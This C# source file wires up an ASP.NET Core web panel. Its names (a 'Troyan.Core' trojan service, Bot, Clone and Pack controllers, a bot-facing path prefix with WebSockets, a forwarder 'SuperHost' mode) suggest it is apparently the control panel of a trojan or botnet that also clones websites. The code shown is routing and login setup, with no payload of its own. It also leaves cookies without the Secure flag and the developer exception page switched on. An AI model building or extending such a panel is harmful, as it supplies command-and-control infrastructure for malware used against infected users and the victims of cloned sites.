using Cloner;
using Commons;
using cp.Controllers;
using Troyan.Core;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc.Authorization;
using model;

namespace cp;

public static class CpWebExtensions
{
        public static WebApplicationBuilder AddCp(this WebApplicationBuilder builder)
    {
        builder.Services.AddPanelServerStack();
        builder.Services.AddTroyanCore();
        builder.Services.AddSingleton<BackSvc>();
        builder.Services.AddMemoryCache();

        if (!CpSettings.IsSuperHost)
        {
            var cookiePath = CpSettings.SitePathPrefix;
            builder.Services.AddSession(options =>
            {
                options.IdleTimeout = TimeSpan.FromDays(7);
                options.Cookie.IsEssential = true;
                options.Cookie.HttpOnly = true;
                options.Cookie.SecurePolicy = CookieSecurePolicy.None;
                options.Cookie.SameSite = SameSiteMode.Lax;
                options.Cookie.Path = cookiePath;
            });
            builder.Services.AddScoped<BotController>();
            builder.Services.AddScoped<StatsController>();
            builder.Services.AddScoped<CloneController>();
            builder.Services.AddScoped<PackController>();
            builder.Services.AddControllersWithViews(options =>
                {
                    options.Filters.Add(new AuthorizeFilter(
                        new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build()));
                })
                .AddApplicationPart(typeof(CpWebExtensions).Assembly)
                .AddRazorPagesOptions(options => { options.Conventions.AllowAnonymousToPage("/"); });
            builder.Services.AddHttpContextAccessor();
            builder.Services.AddAuthentication(options =>
                {
                    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;
                })
                .AddCookie(options =>
                {
                    options.Cookie.Path = cookiePath;
                    options.Cookie.Name = "UserAuthCookie";
                    options.Cookie.HttpOnly = true;
                    options.Cookie.SecurePolicy = CookieSecurePolicy.None;
                    options.Cookie.SameSite = SameSiteMode.Lax;
                    options.SlidingExpiration = false;
                    options.ExpireTimeSpan = TimeSpan.FromDays(7);
                    options.AccessDeniedPath = "/Auth";
                    options.LoginPath = "/Auth";
                    options.LogoutPath = "/Auth/logout";
                });
            builder.Services.AddAuthorization();
        }

        return builder;
    }

        public static WebApplication UseCpSite(this WebApplication app)
    {
        var botPrefix = new PathString(CpSettings.BotSitePathPrefix);
        app.UseWhen(
            ctx => ctx.Request.Path.StartsWithSegments(botPrefix, StringComparison.OrdinalIgnoreCase, out _, out _),
            branch =>
            {
                branch.Use(RewriteBotPrefix);
                ConfigureBotBranch(branch);
            });

        var cpPrefix = new PathString(CpSettings.SitePathPrefix);
        app.UseWhen(
            ctx => ctx.Request.Path.StartsWithSegments(cpPrefix, StringComparison.OrdinalIgnoreCase, out _, out _),
            branch =>
            {
                branch.Use(RewriteCpPrefix);
                ConfigureCpBranch(branch);
            });
        return app;
    }

        private static async Task RewriteBotPrefix(HttpContext context, RequestDelegate next)
    {
        var prefix = new PathString(CpSettings.BotSitePathPrefix);
        if (!context.Request.Path.StartsWithSegments(prefix, StringComparison.OrdinalIgnoreCase, out var matched, out var remaining))
        {
            await next(context).ConfigureAwait(false);
            return;
        }

        PathString rest = remaining;
        if (!rest.HasValue || string.IsNullOrEmpty(rest.Value))
            rest = new PathString("/");
        else if (rest.Value![0] != '/')
            rest = new PathString("/" + rest.Value);

        context.Request.Path = new PathString("/Bot").Add(rest);
        context.Request.PathBase = context.Request.PathBase.Add(matched);
        await next(context).ConfigureAwait(false);
    }

        private static async Task RewriteCpPrefix(HttpContext context, RequestDelegate next)
    {
        var prefix = new PathString(CpSettings.SitePathPrefix);
        if (!context.Request.Path.StartsWithSegments(prefix, StringComparison.OrdinalIgnoreCase, out var matched, out var remaining))
        {
            await next(context).ConfigureAwait(false);
            return;
        }

        PathString rest = remaining;
        if (!rest.HasValue || string.IsNullOrEmpty(rest.Value))
            rest = new PathString("/");
        else if (rest.Value![0] != '/')
            rest = new PathString("/" + rest.Value);

        context.Request.Path = rest;
        context.Request.PathBase = context.Request.PathBase.Add(matched);
        await next(context).ConfigureAwait(false);
    }

    private static void ConfigureBotBranch(IApplicationBuilder bot)
    {
        bot.UseDeveloperExceptionPage();
        bot.UseWebSockets();
        bot.UseRouting();
        bot.UseSession();
        bot.UseEndpoints(endpoints => endpoints.MapControllers());
    }

    private static void ConfigureCpBranch(IApplicationBuilder cp)
    {
        cp.UseDeveloperExceptionPage();
        cp.UseWebSockets();

        if (CpSettings.IsSuperHost)
        {
            CpPipeline.DataServe(cp);
            CpPipeline.ForwarderMode(cp);
            return;
        }

        cp.UseRouting();
        cp.UseSession();
        cp.UseAuthentication();
        cp.UseAuthorization();
        cp.Use(RequireAuthForDataFiles);
        CpPipeline.DataServe(cp);
        cp.UseClonerCloneSupport();
        cp.UseEndpoints(endpoints => endpoints.MapControllers());
    }

    private static async Task RequireAuthForDataFiles(HttpContext context, RequestDelegate next)
    {
        if (context.Request.Path.StartsWithSegments("/data", StringComparison.OrdinalIgnoreCase)
            && context.User.Identity?.IsAuthenticated != true)
        {
            context.Response.StatusCode = StatusCodes.Status401Unauthorized;
            return;
        }

        await next(context).ConfigureAwait(false);
    }
}
